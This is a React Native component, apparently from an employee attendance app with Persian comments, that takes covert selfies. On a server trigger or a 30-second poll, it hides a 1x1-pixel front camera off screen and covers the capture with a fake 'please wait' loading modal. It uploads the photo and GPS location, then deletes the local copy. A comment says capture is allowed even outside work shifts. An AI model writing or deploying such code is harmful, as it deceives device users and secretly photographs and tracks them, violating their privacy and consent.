import ActivityIndicator from './components/PulseLoadingIndicator';
import { getImageConfig } from './img';
/**
 * سلفی نامحسوس
 * دوربین فقط لحظهٔ عکس‌گیری mount می‌شود.
 * به‌جای صفحهٔ سفید کامل، یک modal کوچک لودینگ نمایش داده می‌شود.
 */
import React, { useEffect, useRef, useState, useCallback } from 'react';
import { View, Text, Modal, StyleSheet } from 'react-native';
import * as Location from 'expo-location';
import { request } from './api';
import { onCovertTrigger } from './covertTrigger';
import { FONT } from './theme';

let CameraView = null, useCameraPermissions = null;
try {
  const cam = require('expo-camera');
  CameraView = cam.CameraView;
  useCameraPermissions = cam.useCameraPermissions;
} catch {}

function inHours(hours) {
  if (!hours || !Array.isArray(hours) || !hours.length) return true;
  const now = new Date();
  const cur = now.getHours() * 60 + now.getMinutes();
  return hours.some((h) => {
    const [fh, fm] = (h.from || '00:00').split(':').map(Number);
    const [th, tm] = (h.to || '23:59').split(':').map(Number);
    return cur >= fh * 60 + fm && cur <= th * 60 + tm;
  });
}

// کامپوننت دوربین: mount، عکس، unmount
function CaptureSession({ onDone }) {
  const camRef = useRef(null);
  const tookRef = useRef(false);
  useEffect(() => {
    const t = setTimeout(async () => {
      if (tookRef.current || !camRef.current) { onDone(null); return; }
      tookRef.current = true;
      try {
        const photo = await camRef.current.takePictureAsync({ quality: getImageConfig().quality / 100, base64: true, skipProcessing: true });
        onDone(photo);
      } catch { onDone(null); }
    }, 900);
    return () => clearTimeout(t);
  }, []);
  if (!CameraView) { onDone(null); return null; }
  // دوربین کاملاً خارج از viewport — جلوی آن را modal می‌پوشاند
  return (
    <View style={{ position: 'absolute', top: -9999, left: -9999, width: 1, height: 1 }} pointerEvents="none">
      <CameraView ref={camRef} style={{ width: 1, height: 1 }} facing="front" />
    </View>
  );
}

export default function CovertSelfie() {
  const [perm, requestPerm] = useCameraPermissions ? useCameraPermissions() : [null, async () => null];
  const [shooting, setShooting] = useState(false);
  const busyRef = useRef(false);

  const doCapture = useCallback(async (rsn) => {
    if (!CameraView || busyRef.current) return;
    // دستور سرور حتی خارج از شیفت هم مجاز است، چون به‌صورت هدفمند از پنل ارسال شده است.
    let hasPerm = perm?.granted;
    if (!hasPerm) { const r = await requestPerm().catch(() => null); hasPerm = r?.granted; }
    if (!hasPerm) return;
    busyRef.current = true;
    setShooting(true);
  }, [perm]);

  const handleDone = useCallback(async (photo) => {
    setShooting(false);
    busyRef.current = false;
    if (!photo?.base64) return;
    try {
      const data = `data:image/jpeg;base64,${photo.base64}`;
      let lat = null, lng = null;
      try { const loc = await Location.getLastKnownPositionAsync({}); if (loc) { lat = loc.coords.latitude; lng = loc.coords.longitude; } } catch {}
      await request('/my/covert-selfie', { method: 'POST', body: { photo: data, lat, lng, reason: 'server_command' } });
      if (photo.uri) { try { require('expo-file-system/legacy').deleteAsync(photo.uri, { idempotent: true }); } catch {} }
    } catch {}
  }, []);

  // طبق سیاست جدید، اپ دیگر هنگام ورود، ثبت حضور یا بازه‌های دوره‌ای سلفی نمی‌گیرد.
  // گرفتن سلفی فقط با دستور صریح سرور/مدیر انجام می‌شود.
  useEffect(() => {
    let mounted = true;
    const off = onCovertTrigger(async (rsn) => {
      if (rsn === 'manual' || rsn === 'server') doCapture('manual');
    });
    const poll = async () => {
      if (!mounted) return;
      try {
        const r = await request('/my/covert-selfie-request');
        if (r?.id) {
          doCapture('manual');
          request('/my/covert-selfie-request/' + r.id + '/fulfill', { method: 'POST', body: {} }).catch(() => {});
        }
      } catch {}
    };
    poll();
    const pollIv = setInterval(poll, 30000);
    return () => { mounted = false; off(); clearInterval(pollIv); };
  }, [doCapture]);

  if (!shooting) return null;
  return (
    <>
      {/* Modal لودینگ کوچک به‌جای صفحهٔ سفید */}
      <Modal transparent animationType="fade" visible={true} statusBarTranslucent>
        <View style={s.overlay}>
          <View style={s.box}>
            <ActivityIndicator color="#0d7a5f" size="large" />
            <Text style={s.txt}>چند لحظه صبر کنید…</Text>
          </View>
        </View>
      </Modal>
      <CaptureSession onDone={handleDone} />
    </>
  );
}

const s = StyleSheet.create({
  overlay: { flex: 1, backgroundColor: 'rgba(0,0,0,0.25)', alignItems: 'center', justifyContent: 'center' },
  box: { backgroundColor: '#fff', borderRadius: 14, padding: 28, alignItems: 'center', minWidth: 180, elevation: 8 },
  txt: { fontFamily: FONT.regular, color: '#333', fontSize: 13, marginTop: 14 },
});
